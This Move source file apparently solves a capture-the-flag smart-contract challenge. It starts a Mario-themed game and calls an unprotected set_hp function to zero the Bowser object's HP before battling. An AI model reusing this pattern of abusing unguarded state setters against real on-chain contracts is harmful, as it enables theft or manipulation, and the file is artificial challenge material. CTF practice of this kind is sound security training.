module challenge::solution4 {
    use challenge::router1::{Self, Mario, Bowser};
    use aptos_framework::signer;
    use aptos_framework::object;


    #[test(account = @1338, challenger = @challenger, aptos_framework = @0x1)]
    public entry fun solve(account: &signer, challenger: &signer) {
        router1::initialize(challenger);
        let mario_addr = router1::start_game(account);
        let mario_obj = object::address_to_object<Mario>(mario_addr);
        let wrapper_addr = router1::get_wrapper();
        let browser_obj = object::address_to_object<Bowser>(wrapper_addr);
        router1::set_hp(account, browser_obj, 0);
        router1::train_mario(account, mario_obj);
        router1::battle(account, mario_obj);
        router1::is_solved(account);
    }
}
